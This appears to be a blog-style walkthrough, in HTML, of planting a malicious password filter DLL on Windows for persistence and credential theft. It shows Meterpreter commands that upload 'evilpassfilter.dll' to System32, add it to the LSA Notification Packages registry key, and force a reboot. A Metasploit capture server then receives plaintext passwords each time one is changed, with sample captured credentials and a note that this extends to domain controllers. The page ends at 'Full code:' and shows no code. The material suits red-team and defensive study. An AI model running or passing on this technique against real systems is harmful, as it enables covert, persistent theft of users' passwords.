<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example 1</title>
</head><body>So lets walk the exploitation:<br/>
<br/>
First, you have to be admin or system, as this is more of a persistence method than anything.<br/>
meterpreter &gt; getuid<br/>
Server username: NT AUTHORITY\SYSTEM<br/>
<br/>
<br/>
Next, we upload the evilpassfilter.dll to Sytem32:<br/>
meterpreter &gt; pwd<br/>
C:\Windows\system32<br/>
meterpreter &gt; upload /tmp/evilpassfilter.dll .<br/>
[*] uploading &nbsp;: /tmp/evilpassfilter.dll -&gt; .<br/>
[*] uploaded &nbsp; : /tmp/evilpassfilter.dll -&gt; .\evilpassfilter.dll<br/>
<br/>
<br/>
Then we need to query what is already in the notification packages list:<br/>
meterpreter &gt; reg queryval -k HKLM\\System\\CurrentControlSet\\Control\\Lsa -v "Notification Packages"<br/>
Key: HKLM\System\CurrentcontrolSet\Control\Lsa<br/>
Name: Notification Packages<br/>
Type:<br/>
Data: sceclirassfm<br/>
<br/>
<br/>
What you can't see here since Metasploit isn't showing the line breaks is that there are two there by default:<br/>
scecli<br/>
rassfm<br/>
<br/>
<br/>
We need to add ours to the end of this list, unfortunately at the current point of time its impossible to do directly from the meterpreter command line (as far as I know). So we need to drop a .reg file and manually import it. Easiest way to do that is to add your "evilpassfilter" string as well as the ones on the victim to a VM you have and export it. Should look like this:<br/>
<img src="image.png" /><br/>
<br/>
Once we have our file, we upload and import it using reg command:<br/>
meterpreter &gt; upload importme.reg .<br/>
[*] uploading &nbsp;: importme.reg -&gt; .<br/>
[*] uploaded &nbsp; : importme.reg -&gt; .\importme.reg<br/>
meterpreter &gt; execute -H -f regedit.exe -a '/s importme.reg'<br/>
Process 2628 created.<br/>
meterpreter &gt; <br/>
<br/>
<br/>
Double check our work:<br/>
meterpreter &gt; reg queryval -k HKLM\\System\\CurrentcontrolSet\\Control\\Lsa -v "Notification Packages"<br/>
Key: HKLM\System\CurrentcontrolSet\Control\Lsa<br/>
Name: Notification Packages<br/>
Type:<br/>
Data: sceclirnrassfmrnevilpassfilter <br/>
<br/>
<br/>
Its there, w00t! But it doesn't do anything until a reboot happens :(. Lets just force that to happen (not the most stealthy thing to do):<br/>
meterpreter &gt; reboot<br/>
Rebooting...<br/>
<br/>
<br/>
While thats going on, lets set up the server to catch the basic auth.<br/>
msf exploit(psexec) &gt; use auxiliary/server/capture/http_basic<br/>
msf auxiliary(http_basic) &gt; set URIPATH /<br/>
URIPATH =&gt; /<br/>
msf auxiliary(http_basic) &gt; run<br/>
[*] Auxiliary module execution completed<br/>
msf auxiliary(http_basic) &gt;<br/>
[*] Listening on 0.0.0.0:80...<br/>
[*] Using URL: http://0.0.0.0:80/<br/>
[*] &nbsp;Local IP: http://192.168.92.106:80/<br/>
[*] Server started.<br/>
msf auxiliary(http_basic) &gt; <br/>
<br/>
<br/>
Then we wait for a password to be changed:<br/>
msf auxiliary(http_basic) &gt;<br/>
[*] 192.168.92.106 &nbsp; http_basic - Sending 401 to client<br/>
[+] 192.168.92.106 - Credential collected: "jack:ASDqwe123" =&gt; /<br/>
<br/>
<br/>
No matter how complex their password is and without having a shell on the box anymore:<br/>
msf auxiliary(http_basic) &gt;<br/>
[+] 192.168.92.106 - Credential collected: "jack:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes&lt;;6#0$puQ%Q&amp;,@ZwY(T@p" =&gt; /<br/>
<br/>
<br/>
This works from Windows 2000, XP all the way up to Windows 8 &amp; 2012.<br/>
<br/>
Ok, but how often are local password changed? Maybe not that often, but guess what happens when a password filter is put on a domain controller. Every password changed by that DC is "verified" by your evil password filter.<br/>
<br/>
Oh and what does that log file we talked about earlier on the victim look like if for some reason they block that IP you're getting your authentication to? (You would have to find a way to get back on that system, or make it available via a share or otherwise)<br/>
<br/>
InitializeChangeNotify()<br/>
JackJohnson:ASDqwe123<br/>
JackJohnson:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes&lt;;6#0$puQ%Q&amp;,@ZwY(T@p<br/>
<br/>
This attack supports a larger character set than most banks ;-)<br/>
<br/>
<br/>
Resources<br/>
[0] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85).aspx</a>&nbsp;<br/>
[1] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx</a>&nbsp;<br/>
[2] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx</a>&nbsp;<br/>
Full code:<br/>
<br/>
</body></html>